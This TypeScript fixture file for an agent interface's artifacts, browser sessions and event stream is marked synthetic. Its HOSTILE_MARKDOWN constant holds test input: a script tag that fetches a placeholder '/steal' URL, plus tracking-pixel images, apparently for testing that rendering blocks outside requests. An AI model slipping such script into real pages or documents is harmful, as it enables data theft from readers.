// Typed fixtures for the interactive surfaces: artifacts, files, the
// agent's status and a browser session, typed against the generated wire
// types. Synthetic: no real people, files, sites or pages.
import { sampleEvent, sampleTime } from './fixtures.js';
import type { BrowserSession, FileFormat, InlineImage, UiActionResult, UiArtifact, UiResponse } from './protocol/generated.js';
/** A one-pixel PNG. */
export const SAMPLE_PNG: InlineImage = { media_type: 'png', base64: 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==' };
/**
 * Markdown an artifact could carry to reach outside: a script, an image that
 * would fetch on render, a remote image in markdown form, and links.
 */
export const HOSTILE_MARKDOWN = [
    '# Quarterly notes',
    `<script>fetch("https://example.invalid/steal")<${'/'}script>`,
    '<img src="https://example.invalid/pixel.png"> ![tracker](https://example.invalid/t.png)',
    '[Open the sample file](artifact:sample-file) and [the sample site](https://example.invalid/page).',
    '**Plain formatting** stays.',
].join('\n');
/** An artifact listing with `revisions` revisions, newest last. */
export function sampleArtifact(artifactId: string, format: FileFormat, revisions = 1, shared: number | null = null): UiArtifact {
    return {
        artifact_id: artifactId,
        title: `Sample ${format} file`,
        format,
        revisions: Array.from({ length: revisions }, (_, index) => ({ revision: index + 1, build_id: `${artifactId}-build-${index + 1}`, created_at: sampleTime(index), bytes: 100 * (index + 1), attribution: index === 0 ? null : 'Sample builder' })),
        shared_revision: shared,
    };
}
/** The answer to `open_artifact` with text content. */
export function openedText(artifactId: string, revision: number, text: string): UiActionResult {
    return { result: 'artifact_opened', artifact_id: artifactId, revision, body: { type: 'text', text } };
}
/** A browser session for the sample chat. */
export function sampleSession(sessionId: string, state: BrowserSession['state'] = 'running', chatId: string | null = 'main'): BrowserSession {
    return { session_id: sessionId, chat_id: chatId, title: 'Find a sample tote bag', site: 'shop.example.invalid', state, step: 'Searching the sample shop', last_confirmed: 'The sample shop home page' };
}
/** A small session on the surfaces, after the welcome: the agent working, two artifacts, a file sent in the chat, and a browser session with one frame and one action. */
export const SURFACE_EVENTS: readonly UiResponse[] = [
    sampleEvent(1, 1, { kind: 'agent_status', state: 'working', detail: 'Drafting the sample notes' }),
    sampleEvent(2, 2, { kind: 'artifact_listed', ...sampleArtifact('notes', 'markdown', 2, 1) }),
    sampleEvent(3, 3, { kind: 'artifact_listed', ...sampleArtifact('photo', 'image') }),
    sampleEvent(4, 4, { kind: 'attachment', chat_id: 'main', message_id: 'file-1', author: 'agent', artifact_id: 'notes', revision: 2, text: 'Here are the sample notes.' }),
    sampleEvent(5, 5, { kind: 'browser_session', ...sampleSession('web-1') }),
    sampleEvent(6, 6, { kind: 'browser_frame', session_id: 'web-1', sequence: 1, captured_at: sampleTime(6), title: 'Sample shop', image: SAMPLE_PNG }),
    sampleEvent(7, 7, { kind: 'browser_action', session_id: 'web-1', by: 'agent', narration: 'Searched for a tote bag' }),
];
